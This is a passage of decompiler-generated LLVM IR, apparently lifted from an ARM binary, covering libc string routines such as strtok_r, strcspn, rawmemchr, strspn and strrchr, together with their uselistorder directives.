  uselistorder i32 %v0_f130, { 1, 0 }
  uselistorder i32 %v0_f21c, { 4, 1, 0, 3, 2 }
  uselistorder i32 %v0_f17019, { 0, 3, 1, 4, 2, 5 }
  uselistorder i32 %v1_f120, { 2, 1, 0 }
  uselistorder i32 %v0_f120, { 2, 0, 1 }
  uselistorder i32 %v2_f118, { 3, 4, 0, 5, 2, 1 }
  uselistorder i32 %v1_f118, { 1, 2, 0, 3 }
  uselistorder i32 %v0_f118, { 2, 3, 0, 1, 4 }
  uselistorder i32 %v0_f17020, { 2, 1, 0 }
  uselistorder i32 %v11_f0f4, { 1, 0 }
  uselistorder i32 %v7_f0f4, { 1, 0 }
  uselistorder i32 %v1_f0d4, { 0, 1, 3, 4, 2, 5 }
  uselistorder i32 %v0_f0d4, { 1, 2, 0, 3 }
  uselistorder i32 %v2_f0d8, { 1, 0 }
  uselistorder i32 %v7_f0cc, { 0, 2, 1 }
  uselistorder i32 %v10_f0c8, { 1, 0 }
  uselistorder i32 %v9_f0c0, { 1, 0, 2 }
  uselistorder i32 %v6_f0bc, { 1, 0 }
  uselistorder i32 %v2_f0b4, { 0, 2, 1, 3, 5, 6, 4, 7 }
  uselistorder i32 %v0_f0b4, { 1, 2, 4, 0, 3 }
  uselistorder i32 %v7_f0c4, { 0, 3, 2, 1 }
  uselistorder i32 %v7_f0a8, { 0, 2, 1 }
  uselistorder i32 %v13_f0a4, { 1, 0 }
  uselistorder i32 %v4_f0a0, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v0_f0a0, { 2, 0, 1 }
  uselistorder i32 %v6_f0a8, { 0, 3, 2, 1 }
  uselistorder i32 %v7_f098, { 0, 2, 1 }
  uselistorder i32 %v16_f094, { 1, 0 }
  uselistorder i32 %v4_f090, { 1, 2, 0 }
  uselistorder i32 %v0_f0a0.pr, { 1, 3, 0, 2 }
  uselistorder i32 %v6_f098, { 0, 4, 3, 2, 1 }
  uselistorder i32 %v1_f084, { 0, 3, 2, 1 }
  uselistorder i32 %v10_f080, { 1, 0 }
  uselistorder i32 %v1_f07c, { 1, 0 }
  uselistorder i32 %v10_f078, { 1, 0 }
  uselistorder i32 %v0_f078, { 3, 2, 1, 0 }
  uselistorder i32 %v0_f07c, { 0, 1, 2, 3, 7, 6, 5, 4 }
  uselistorder i32 %v2_f070, { 0, 2, 1 }
  uselistorder i32 %v2_f064, { 0, 2, 1, 3, 5, 4 }
  uselistorder i32 %v0_f064, { 1, 2, 6, 3, 0, 5, 4 }
  uselistorder i32 %v0_f07c37, { 1, 2, 0 }
  uselistorder i32 %v1_f05c, { 2, 1, 0 }
  uselistorder i32 %v1_f054, { 2, 3, 1, 0 }
  uselistorder i32 %v2_f04c, { 2, 0, 1, 4, 3 }
  uselistorder i32 %v2_f048, { 3, 4, 1, 2, 0, 5 }
  uselistorder i32 %v2_f044, { 2, 3, 1, 0, 4 }
  uselistorder i32 %v1_f044, { 3, 4, 0, 6, 5, 1, 2 }
  uselistorder i32 %v1_f034, { 0, 2, 1 }
  uselistorder i32 %v4_f030, { 1, 0 }
  uselistorder i32 %v3_f024, { 1, 0 }
  uselistorder i32 %v1_f01c, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v1_f010, { 1, 0 }
  uselistorder i32 %v12_f00c, { 0, 2, 1 }
  uselistorder i32 %v8_efec, { 1, 0, 2 }
  uselistorder i32 %v5_efec, { 1, 0, 2 }
  uselistorder i32 %v2_efec, { 1, 0, 2 }
  uselistorder i32 %v0_efec, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_f00c, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_efc8, { 0, 2, 1 }
  uselistorder i32 %v4_efc4, { 1, 0 }
  uselistorder i32 %v3_efb8, { 1, 0 }
  uselistorder i32 %v1_efb0, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v1_efa4, { 1, 0 }
  uselistorder i32 %v12_efa0, { 0, 2, 1 }
  uselistorder i32 %v8_ef80, { 1, 0, 2 }
  uselistorder i32 %v5_ef80, { 1, 0, 2 }
  uselistorder i32 %v2_ef80, { 1, 0, 2 }
  uselistorder i32 %v0_ef80, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_efa0, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_ef5c, { 0, 2, 1 }
  uselistorder i32 %v4_ef58, { 1, 0 }
  uselistorder i32 %v3_ef4c, { 1, 0 }
  uselistorder i32 %v1_ef44, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v1_ef38, { 1, 0 }
  uselistorder i32 %v12_ef34, { 0, 2, 1 }
  uselistorder i32 %v8_ef14, { 1, 0, 2 }
  uselistorder i32 %v5_ef14, { 1, 0, 2 }
  uselistorder i32 %v2_ef14, { 1, 0, 2 }
  uselistorder i32 %v0_ef14, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_ef34, { 4, 3, 2, 1, 0 }
  uselistorder i1 %v2_ef70, { 0, 2, 1 }
  uselistorder i32 %v1_ef6c, { 2, 0, 1, 3 }
  uselistorder i32 %v4_eef0, { 2, 0, 1, 3 }
  uselistorder i32 %v2_eef0, { 2, 0, 1, 3 }
  uselistorder i32 %v0_ef74, { 1, 0, 3, 2 }
  uselistorder i32 %v0_f00c76, { 0, 5, 1, 3, 2, 4 }
  uselistorder i32 %v1_eee4, { 1, 0 }
  uselistorder i32 %v0_eee4, { 3, 1, 0, 2 }
  uselistorder i32 %v2_eedc, { 2, 4, 0, 5, 1, 3 }
  uselistorder i32 %v1_eedc, { 1, 0, 2 }
  uselistorder i32 %v0_eedc, { 2, 0, 1, 3 }
  uselistorder i32 %v0_f00c77, { 1, 0 }
  uselistorder i32 %v1_eebc, { 1, 0, 3, 2, 4 }
  uselistorder i32 %v0_eec4, { 1, 0 }
  uselistorder i32 %v0_ee98, { 3, 0, 1, 2 }
  uselistorder i32 %v1_ee8c, { 1, 2, 0, 3 }
  uselistorder i32 %v5_ee78, { 1, 0, 2 }
  uselistorder i32 %v1_ee74, { 1, 0 }
  uselistorder i32 %v1_ee6c, { 2, 0, 1, 4, 5, 3, 6 }
  uselistorder i32 %v0_ee6c, { 1, 2, 0, 3 }
  uselistorder i32 %v4_ee64, { 0, 2, 1 }
  uselistorder i32 %v3_ee64, { 3, 0, 1, 2 }
  uselistorder i1 %v0_ee64, { 1, 0 }
  uselistorder i1 %v1_ee64, { 1, 0 }
  uselistorder i32 %v3_ee60, { 0, 4, 3, 2, 1 }
  uselistorder i32 %v1_ee58, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v1_ee44, { 1, 2, 0 }
  uselistorder i32 %v1_ee3c, { 0, 2, 1 }
  uselistorder i32 %v12_ee38, { 0, 1, 3, 2 }
  uselistorder i32 %v0_ee2c, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_ee30, { 0, 1, 2, 3, 4, 5, 6, 7, 12, 11, 10, 9, 8 }
  uselistorder i32 %v1_ee20, { 0, 2, 1 }
  uselistorder i32 %v1_ee18, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v0_ee18, { 1, 2, 3, 0, 5, 4 }
  uselistorder i32 %v1_ee10, { 1, 0 }
  uselistorder i32 %v1_ee08, { 2, 1, 0 }
  uselistorder i32 %v2_ee00, { 1, 2, 0, 4, 3 }
  uselistorder i32 %v0_ee00, { 1, 4, 0, 2, 3 }
  uselistorder i32 %v8_edfc, { 1, 0 }
  uselistorder i32 %v2_edf0, { 1, 0 }
  uselistorder i32 %v1_edf0, { 1, 4, 5, 3, 0, 6, 8, 2, 7, 9 }
  uselistorder i32 %v0_edf0, { 1, 7, 8, 6, 4, 0, 5, 10, 2, 3, 9, 11 }
  uselistorder i8** %stack_var_-8, { 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32* %r5.global-to-local, { 0, 1, 2, 3, 4, 5, 15, 16, 17, 6, 7, 8, 9, 10, 11, 12, 13, 14 }
  uselistorder i32* %r4.global-to-local, { 0, 1, 2, 3, 4, 26, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25 }
  uselistorder i32* %r2.global-to-local, { 0, 68, 1, 2, 3, 4, 5, 69, 6, 7, 8, 9, 10, 70, 11, 12, 66, 67, 71, 27, 13, 15, 14, 16, 17, 18, 19, 20, 21, 23, 22, 24, 25, 26, 28, 29, 61, 30, 31, 32, 33, 34, 62, 35, 36, 37, 38, 39, 63, 40, 41, 42, 43, 44, 64, 45, 46, 47, 49, 48, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 65 }
  uselistorder i32* %r1.global-to-local, { 2, 5, 3, 77, 4, 6, 8, 10, 7, 78, 9, 11, 13, 75, 12, 79, 74, 76, 80, 83, 81, 87, 88, 14, 15, 16, 18, 17, 19, 20, 82, 21, 22, 84, 23, 85, 24, 86, 25, 26, 27, 28, 29, 31, 33, 30, 45, 32, 34, 36, 38, 35, 46, 37, 39, 41, 43, 40, 47, 42, 44, 48, 49, 54, 50, 52, 51, 53, 55, 58, 56, 59, 57, 60, 61, 67, 62, 63, 68, 64, 69, 65, 70, 66, 71, 72, 73, 0, 1 }
  uselistorder i32* %r0.global-to-local, { 2, 56, 3, 4, 57, 5, 6, 58, 7, 55, 61, 62, 8, 9, 21, 10, 12, 11, 13, 14, 59, 15, 16, 60, 17, 18, 19, 20, 22, 23, 31, 24, 25, 32, 26, 27, 33, 28, 29, 34, 30, 35, 36, 38, 37, 39, 40, 42, 41, 43, 44, 50, 51, 45, 46, 47, 52, 48, 49, 53, 54, 0, 1 }
  uselistorder i32* %lr.global-to-local, { 0, 1, 2, 3, 4, 5, 35, 36, 37, 6, 7, 8, 9, 10, 11, 12, 13, 14, 23, 15, 16, 17, 24, 18, 19, 20, 25, 21, 22, 26, 27, 28, 29, 30, 31, 32, 33, 34 }
  uselistorder i1* %cpsr_z.global-to-local, { 4, 7, 5, 9, 6, 10, 8, 46, 47, 11, 12, 13, 14, 15, 16, 17, 18, 3, 19, 20, 21, 22, 23, 2, 24, 0, 25, 1, 27, 26, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45 }
  uselistorder i1* %cpsr_v.global-to-local, { 4, 7, 5, 9, 6, 10, 8, 44, 11, 12, 13, 14, 15, 16, 17, 18, 19, 3, 20, 21, 22, 2, 23, 0, 24, 1, 26, 25, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43 }
  uselistorder i1* %cpsr_n.global-to-local, { 4, 7, 5, 9, 6, 10, 8, 49, 50, 11, 12, 13, 14, 15, 16, 17, 18, 19, 3, 20, 21, 22, 23, 24, 2, 25, 0, 26, 1, 28, 27, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48 }
  uselistorder i32 2147483632, { 3, 4, 5, 2, 0, 1, 6 }
  uselistorder i32 -28, { 1, 2, 0 }
  uselistorder label %dec_label_pc_f260, { 2, 0, 1 }
  uselistorder label %dec_label_pc_f1f4, { 2, 0, 1 }
  uselistorder label %dec_label_pc_f188, { 2, 0, 1 }
  uselistorder label %dec_label_pc_f128, { 1, 0 }
  uselistorder label %.thread14, { 2, 0, 1 }
  uselistorder label %.thread129, { 1, 0 }
  uselistorder label %bb151, { 4, 5, 6, 3, 7, 0, 1, 2 }
  uselistorder label %dec_label_pc_f0b4, { 1, 0 }
  uselistorder label %.thread4, { 1, 0 }
  uselistorder label %.thread2, { 1, 0 }
  uselistorder label %dec_label_pc_f078, { 1, 0 }
  uselistorder label %dec_label_pc_f064, { 1, 0 }
  uselistorder label %dec_label_pc_f024, { 2, 0, 1 }
  uselistorder label %dec_label_pc_efb8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_ef4c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_eeec, { 1, 0 }
  uselistorder label %.thread128, { 1, 0 }
  uselistorder label %.thread127, { 1, 0 }
  uselistorder label %dec_label_pc_eebc, { 1, 0 }
  uselistorder label %.thread126, { 1, 0 }
  uselistorder label %.thread125, { 1, 0 }
  uselistorder label %bb143, { 1, 0 }
  uselistorder label %bb141, { 4, 5, 6, 1, 7, 0, 2, 3 }
  uselistorder label %.thread115, { 1, 0 }
  uselistorder label %dec_label_pc_ee58, { 1, 0 }
  uselistorder label %bb138, { 1, 0 }
  uselistorder label %dec_label_pc_ee18, { 1, 0 }
}

define i32 @strtok_r() local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_f280 = load i32, i32* @r4, align 4
  store i32 %v3_f280, i32* %stack_var_-16, align 4
  %v0_f284 = load i32, i32* @r0, align 4
  store i32 %v0_f284, i32* %r4.global-to-local, align 4
  %v2_f284 = icmp eq i32 %v0_f284, 0
  %v1_f288 = load i32, i32* @r2, align 4
  br i1 %v2_f284, label %bb, label %entry._crit_edge

bb:                                               ; preds = %entry
  %v2_f288 = inttoptr i32 %v1_f288 to i32*
  %v3_f288 = load i32, i32* %v2_f288, align 4
  store i32 %v3_f288, i32* %r4.global-to-local, align 4
  br label %entry._crit_edge

entry._crit_edge:                                 ; preds = %entry, %bb
  %v0_f28c = phi i32 [ %v3_f288, %bb ], [ %v0_f284, %entry ]
  store i32 %v0_f28c, i32* @r0, align 4
  store i32 %v1_f288, i32* %r5.global-to-local, align 4
  %v0_f294 = load i32, i32* @r1, align 4
  store i32 %v0_f294, i32* %r6.global-to-local, align 4
  %v1_f298 = inttoptr i32 %v0_f28c to i8*
  %v2_f298 = call i32 @__GI_strspn(i8* %v1_f298)
  %v0_f29c = load i32, i32* %r4.global-to-local, align 4
  %v2_f29c = add i32 %v0_f29c, %v2_f298
  %v3_f29c = inttoptr i32 %v2_f29c to i8*
  %v4_f29c = load i8, i8* %v3_f29c, align 1
  %v6_f29c = zext i8 %v4_f29c to i32
  store i32 %v6_f29c, i32* %r3.global-to-local, align 4
  store i32 %v2_f29c, i32* @r4, align 4
  %v2_f2a4 = icmp eq i8 %v4_f29c, 0
  br i1 %v2_f2a4, label %bb8, label %dec_label_pc_f2b0

bb8:                                              ; preds = %entry._crit_edge
  %v2_f2a8 = load i32, i32* %r5.global-to-local, align 4
  %v3_f2a8 = inttoptr i32 %v2_f2a8 to i32*
  store i32 %v2_f29c, i32* %v3_f2a8, align 4
  br label %dec_label_pc_f2ec

dec_label_pc_f2b0:                                ; preds = %entry._crit_edge
  %v0_f2b0 = load i32, i32* %r6.global-to-local, align 4
  %v3_f2b8 = call i32 @__GI_strpbrk(i8* %v3_f29c, i32 %v0_f2b0)
  %v3_f2bc = icmp eq i32 %v3_f2b8, 0
  br i1 %v3_f2bc, label %dec_label_pc_f2c4, label %dec_label_pc_f2dc

dec_label_pc_f2c4:                                ; preds = %dec_label_pc_f2b0
  %v0_f2c8 = load i32, i32* @r4, align 4
  store i32 %v0_f2c8, i32* @r0, align 4
  %v2_f2cc = call i32 @rawmemchr(i32 %v0_f2c8, i32 0)
  %v0_f2d0 = load i32, i32* @r4, align 4
  store i32 %v0_f2d0, i32* %r3.global-to-local, align 4
  %v1_f2d4 = load i32, i32* %r5.global-to-local, align 4
  %v2_f2d4 = inttoptr i32 %v1_f2d4 to i32*
  store i32 %v2_f2cc, i32* %v2_f2d4, align 4
  br label %dec_label_pc_f2ec

dec_label_pc_f2dc:                                ; preds = %dec_label_pc_f2b0
  %v4_f2b8 = inttoptr i32 %v3_f2b8 to i8*
  store i8 0, i8* %v4_f2b8, align 1
  %v7_f2e0 = add i32 %v3_f2b8, 1
  %v1_f2e4 = load i32, i32* %r5.global-to-local, align 4
  %v2_f2e4 = inttoptr i32 %v1_f2e4 to i32*
  store i32 %v7_f2e0, i32* %v2_f2e4, align 4
  %v0_f2e8 = load i32, i32* @r4, align 4
  store i32 %v0_f2e8, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_f2ec

dec_label_pc_f2ec:                                ; preds = %bb8, %dec_label_pc_f2c4, %dec_label_pc_f2dc
  %v0_f2ec = load i32, i32* %r3.global-to-local, align 4
  %v2_f2f0 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_f2f0, i32* @r4, align 4
  ret i32 %v0_f2ec

; uselistorder directives
  uselistorder i32 %v3_f2b8, { 0, 2, 1 }
  uselistorder i32 %v0_f28c, { 1, 0 }
  uselistorder i32 %v0_f284, { 0, 2, 1 }
  uselistorder i32* %r4.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r3.global-to-local, { 2, 0, 1, 3 }
  uselistorder i32 (i8*)* @__GI_strspn, { 2, 0, 1 }
  uselistorder label %dec_label_pc_f2ec, { 2, 1, 0 }
  uselistorder label %entry._crit_edge, { 1, 0 }
}

define i32 @strcspn() local_unnamed_addr {
entry:
  %stack_var_-16 = alloca i32, align 4
  %v3_f2f8 = load i32, i32* @r4, align 4
  store i32 %v3_f2f8, i32* %stack_var_-16, align 4
  %v6_f2f8 = load i32, i32* @r5, align 4
  %v9_f2f8 = load i32, i32* @r6, align 4
  %v0_f2fc = load i32, i32* @r0, align 4
  %v0_f300 = load i32, i32* @r1, align 4
  store i32 %v0_f300, i32* @r6, align 4
  store i32 0, i32* @r5, align 4
  %v1_f31c8 = inttoptr i32 %v0_f2fc to i8*
  %v2_f31c9 = load i8, i8* %v1_f31c8, align 1
  %v2_f32011 = icmp eq i8 %v2_f31c9, 0
  store i32 %v0_f300, i32* @r0, align 4
  %v1_f32812 = add i32 %v0_f2fc, 1
  store i32 %v1_f32812, i32* @r4, align 4
  br i1 %v2_f32011, label %dec_label_pc_f330, label %dec_label_pc_f30c

dec_label_pc_f30c:                                ; preds = %entry, %dec_label_pc_f318
  %v3_f31c14.in = phi i8 [ %v2_f31c, %dec_label_pc_f318 ], [ %v2_f31c9, %entry ]
  %v0_f32413 = phi i32 [ %v0_f324.pre, %dec_label_pc_f318 ], [ %v0_f300, %entry ]
  %v3_f31c14 = zext i8 %v3_f31c14.in to i32
  %v2_f30c = call i32 @__GI_strchr(i32 %v0_f32413, i32 %v3_f31c14)
  %v2_f310 = icmp eq i32 %v2_f30c, 0
  %v0_f318 = load i32, i32* @r5, align 4
  br i1 %v2_f310, label %dec_label_pc_f318, label %dec_label_pc_f330

dec_label_pc_f318:                                ; preds = %dec_label_pc_f30c
  %v1_f318 = add i32 %v0_f318, 1
  %v0_f31c.pre = load i32, i32* @r4, align 4
  %v0_f324.pre = load i32, i32* @r6, align 4
  store i32 %v1_f318, i32* @r5, align 4
  %v1_f31c = inttoptr i32 %v0_f31c.pre to i8*
  %v2_f31c = load i8, i8* %v1_f31c, align 1
  %v2_f320 = icmp eq i8 %v2_f31c, 0
  store i32 %v0_f324.pre, i32* @r0, align 4
  %v1_f328 = add i32 %v0_f31c.pre, 1
  store i32 %v1_f328, i32* @r4, align 4
  br i1 %v2_f320, label %dec_label_pc_f330, label %dec_label_pc_f30c

dec_label_pc_f330:                                ; preds = %dec_label_pc_f318, %dec_label_pc_f30c, %entry
  %v0_f330 = phi i32 [ 0, %entry ], [ %v0_f318, %dec_label_pc_f30c ], [ %v1_f318, %dec_label_pc_f318 ]
  %v2_f334 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_f334, i32* @r4, align 4
  store i32 %v6_f2f8, i32* @r5, align 4
  store i32 %v9_f2f8, i32* @r6, align 4
  ret i32 %v0_f330

; uselistorder directives
  uselistorder i8 %v2_f31c, { 1, 0 }
  uselistorder i32 %v0_f324.pre, { 1, 0 }
  uselistorder i32 %v0_f31c.pre, { 1, 0 }
  uselistorder label %dec_label_pc_f30c, { 1, 0 }
}

define i32 @rawmemchr(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v1_f340 = urem i32 %arg1, 256
  %v0_f3582 = load i32, i32* @r0, align 4
  %v1_f3583 = urem i32 %v0_f3582, 4
  %v2_f3584 = icmp eq i32 %v1_f3583, 0
  br i1 %v2_f3584, label %dec_label_pc_f360, label %dec_label_pc_f348

dec_label_pc_f348:                                ; preds = %entry, %dec_label_pc_f354
  %v0_f354 = phi i32 [ %v1_f354, %dec_label_pc_f354 ], [ %v0_f3582, %entry ]
  %v1_f348 = inttoptr i32 %v0_f354 to i8*
  %v2_f348 = load i8, i8* %v1_f348, align 1
  %v3_f348 = zext i8 %v2_f348 to i32
  %v9_f34c = icmp eq i32 %v3_f348, %v1_f340
  br i1 %v9_f34c, label %dec_label_pc_f3dc, label %dec_label_pc_f354

dec_label_pc_f354:                                ; preds = %dec_label_pc_f348
  %v1_f354 = add i32 %v0_f354, 1
  %v1_f358 = urem i32 %v1_f354, 4
  %v2_f358 = icmp eq i32 %v1_f358, 0
  br i1 %v2_f358, label %dec_label_pc_f360, label %dec_label_pc_f348

dec_label_pc_f360:                                ; preds = %dec_label_pc_f354, %entry
  %v0_f364 = phi i32 [ %v0_f3582, %entry ], [ %v1_f354, %dec_label_pc_f354 ]
  %v4_f360 = mul nuw nsw i32 %v1_f340, 256
  %v5_f360 = or i32 %v4_f360, %v1_f340
  %v4_f368 = mul i32 %v5_f360, 65536
  %v5_f368 = or i32 %v4_f368, %v5_f360
  br label %dec_label_pc_f36c

dec_label_pc_f36c:                                ; preds = %dec_label_pc_f3cc, %dec_label_pc_f36c, %dec_label_pc_f360
  %v0_f3b0 = phi i32 [ %v0_f364, %dec_label_pc_f360 ], [ %v4_f36c, %dec_label_pc_f36c ], [ %v4_f36c, %dec_label_pc_f3cc ]
  %v1_f36c = inttoptr i32 %v0_f3b0 to i32*
  %v2_f36c = load i32, i32* %v1_f36c, align 4
  %v4_f36c = add i32 %v0_f3b0, 4
  %v2_f374 = xor i32 %v2_f36c, %v5_f368
  %v2_f378 = add i32 %v2_f374, 2130640639
  %v1_f380 = sub i32 -1, %v2_f374
  %v2_f384 = xor i32 %v2_f378, %v1_f380
  %v2_f388 = and i32 %v2_f384, -2130640640
  %v2_f38c = icmp eq i32 %v2_f388, 0
  br i1 %v2_f38c, label %dec_label_pc_f36c, label %dec_label_pc_f394

dec_label_pc_f394:                                ; preds = %dec_label_pc_f36c
  %v2_f394 = inttoptr i32 %v0_f3b0 to i8*
  %v3_f394 = load i8, i8* %v2_f394, align 1
  %v4_f394 = zext i8 %v3_f394 to i32
  %v9_f39c = icmp eq i32 %v4_f394, %v1_f340
  %v1_f3a0 = add i32 %v0_f3b0, 3
  br i1 %v9_f39c, label %dec_label_pc_f3dc, label %dec_label_pc_f3a8

dec_label_pc_f3a8:                                ; preds = %dec_label_pc_f394
  %v1_f3a8 = add i32 %v0_f3b0, 1
  %v2_f3a8 = inttoptr i32 %v1_f3a8 to i8*
  %v3_f3a8 = load i8, i8* %v2_f3a8, align 1
  %v4_f3a8 = zext i8 %v3_f3a8 to i32
  %v9_f3ac = icmp eq i32 %v4_f3a8, %v1_f340
  br i1 %v9_f3ac, label %bb, label %dec_label_pc_f3bc

bb:                                               ; preds = %dec_label_pc_f3a8
  br label %dec_label_pc_f3dc

dec_label_pc_f3bc:                                ; preds = %dec_label_pc_f3a8
  %v1_f3bc = add i32 %v0_f3b0, 2
  %v2_f3bc = inttoptr i32 %v1_f3bc to i8*
  %v3_f3bc = load i8, i8* %v2_f3bc, align 1
  %v4_f3bc = zext i8 %v3_f3bc to i32
  %v9_f3c0 = icmp eq i32 %v4_f3bc, %v1_f340
  br i1 %v9_f3c0, label %dec_label_pc_f3dc, label %dec_label_pc_f3cc

dec_label_pc_f3cc:                                ; preds = %dec_label_pc_f3bc
  %v2_f3cc = inttoptr i32 %v1_f3a0 to i8*
  %v3_f3cc = load i8, i8* %v2_f3cc, align 1
  %v4_f3cc = zext i8 %v3_f3cc to i32
  %v9_f3d0 = icmp eq i32 %v4_f3cc, %v1_f340
  br i1 %v9_f3d0, label %dec_label_pc_f3d8, label %dec_label_pc_f36c

dec_label_pc_f3d8:                                ; preds = %dec_label_pc_f3cc
  br label %dec_label_pc_f3dc

dec_label_pc_f3dc:                                ; preds = %dec_label_pc_f348, %dec_label_pc_f3bc, %dec_label_pc_f394, %bb, %dec_label_pc_f3d8
  %v1_f3e0 = phi i32 [ %v1_f3a0, %dec_label_pc_f3d8 ], [ %v1_f3a8, %bb ], [ %v1_f3bc, %dec_label_pc_f3bc ], [ %v0_f3b0, %dec_label_pc_f394 ], [ %v0_f354, %dec_label_pc_f348 ]
  ret i32 %v1_f3e0

; uselistorder directives
  uselistorder i32 %v4_f36c, { 1, 0 }
  uselistorder i32 %v0_f3b0, { 0, 1, 2, 3, 4, 6, 5 }
  uselistorder i32 %v5_f360, { 1, 0 }
  uselistorder i32 %v1_f354, { 1, 0, 2 }
  uselistorder i32 %v0_f3582, { 2, 1, 0 }
  uselistorder i32 %v1_f340, { 2, 3, 4, 5, 6, 0, 1 }
  uselistorder label %dec_label_pc_f3dc, { 4, 1, 3, 2, 0 }
  uselistorder label %dec_label_pc_f348, { 1, 0 }
}

define i32 @__GI_strspn(i8* %arg1) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  %v0_f41c2 = load i32, i32* @r0, align 4
  %v1_f41c3 = inttoptr i32 %v0_f41c2 to i8*
  %v2_f41c4 = load i8, i8* %v1_f41c3, align 1
  %v3_f41c5 = zext i8 %v2_f41c4 to i32
  store i32 %v3_f41c5, i32* @ip, align 4
  %v2_f4206 = icmp eq i8 %v2_f41c4, 0
  br i1 %v2_f4206, label %dec_label_pc_f42c, label %dec_label_pc_f400.preheader

dec_label_pc_f3f8:                                ; preds = %dec_label_pc_f400
  %v3_f400 = zext i8 %v2_f400 to i32
  %v1_f408 = add i32 %v0_f408, 1
  %v9_f3f8 = icmp eq i32 %v0_f3f810, %v3_f400
  br i1 %v9_f3f8, label %dec_label_pc_f414, label %dec_label_pc_f400

dec_label_pc_f400:                                ; preds = %dec_label_pc_f400.preheader, %dec_label_pc_f3f8
  %v0_f408 = phi i32 [ %tmp, %dec_label_pc_f400.preheader ], [ %v1_f408, %dec_label_pc_f3f8 ]
  %v1_f400 = inttoptr i32 %v0_f408 to i8*
  %v2_f400 = load i8, i8* %v1_f400, align 1
  %v2_f404 = icmp eq i8 %v2_f400, 0
  br i1 %v2_f404, label %dec_label_pc_f42c, label %dec_label_pc_f3f8

dec_label_pc_f414:                                ; preds = %dec_label_pc_f3f8
  %v1_f414 = add i32 %v0_f414, 1
  %v1_f418 = add i32 %v0_f418, 1
  %v1_f41c = inttoptr i32 %v1_f418 to i8*
  %v2_f41c = load i8, i8* %v1_f41c, align 1
  %v3_f41c = zext i8 %v2_f41c to i32
  store i32 %v3_f41c, i32* @ip, align 4
  %v2_f420 = icmp eq i8 %v2_f41c, 0
  br i1 %v2_f420, label %dec_label_pc_f42c, label %dec_label_pc_f400.preheader

dec_label_pc_f400.preheader:                      ; preds = %entry, %dec_label_pc_f414
  %v0_f418 = phi i32 [ %v1_f418, %dec_label_pc_f414 ], [ %v0_f41c2, %entry ]
  %v0_f414 = phi i32 [ %v1_f414, %dec_label_pc_f414 ], [ 0, %entry ]
  %v0_f3f810 = phi i32 [ %v3_f41c, %dec_label_pc_f414 ], [ %v3_f41c5, %entry ]
  br label %dec_label_pc_f400

dec_label_pc_f42c:                                ; preds = %dec_label_pc_f414, %dec_label_pc_f400, %entry
  %v0_f42c = phi i32 [ 0, %entry ], [ %v0_f414, %dec_label_pc_f400 ], [ %v1_f414, %dec_label_pc_f414 ]
  ret i32 %v0_f42c

; uselistorder directives
  uselistorder i32 %v0_f408, { 1, 0 }
  uselistorder label %dec_label_pc_f400.preheader, { 1, 0 }
}

define i32 @__GI_strrchr(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  %v1_f43c = urem i32 %arg2, 256
  store i32 %v1_f43c, i32* @r4, align 4
  %v2_f43c = icmp eq i32 %v1_f43c, 0
  br i1 %v2_f43c, label %dec_label_pc_f450, label %dec_label_pc_f464.preheader

dec_label_pc_f464.preheader:                      ; preds = %entry
  store i32 0, i32* @r5, align 4
  store i32 %arg1, i32* @r0, align 4
  %v2_f46c3 = call i32 @__GI_strchr(i32 %arg1, i32 %v1_f43c)
  %v2_f4705 = icmp eq i32 %v2_f46c3, 0
  br i1 %v2_f4705, label %dec_label_pc_f478, label %dec_label_pc_f45c

dec_label_pc_f450:                                ; preds = %entry
  %v2_f454 = call i32 @__GI_strchr(i32 %arg1, i32 0)
  br label %dec_label_pc_f47c

dec_label_pc_f45c:                                ; preds = %dec_label_pc_f464.preheader, %dec_label_pc_f45c
  %v2_f46c6 = phi i32 [ %v2_f46c, %dec_label_pc_f45c ], [ %v2_f46c3, %dec_label_pc_f464.preheader ]
  store i32 %v2_f46c6, i32* @r5, align 4
  %v1_f460 = add i32 %v2_f46c6, 1
  store i32 %v1_f460, i32* @r0, align 4
  %v0_f468 = load i32, i32* @r4, align 4
  %v2_f46c = call i32 @__GI_strchr(i32 %v1_f460, i32 %v0_f468)
  %v2_f470 = icmp eq i32 %v2_f46c, 0
  br i1 %v2_f470, label %dec_label_pc_f478, label %dec_label_pc_f45c

dec_label_pc_f478:                                ; preds = %dec_label_pc_f45c, %dec_label_pc_f464.preheader
  %v0_f478 = load i32, i32* @r5, align 4
  br label %dec_label_pc_f47c

dec_label_pc_f47c:                                ; preds = %dec_label_pc_f450, %dec_label_pc_f478
  %storemerge = phi i32 [ %v2_f454, %dec_label_pc_f450 ], [ %v0_f478, %dec_label_pc_f478 ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v2_f46c, { 1, 0 }
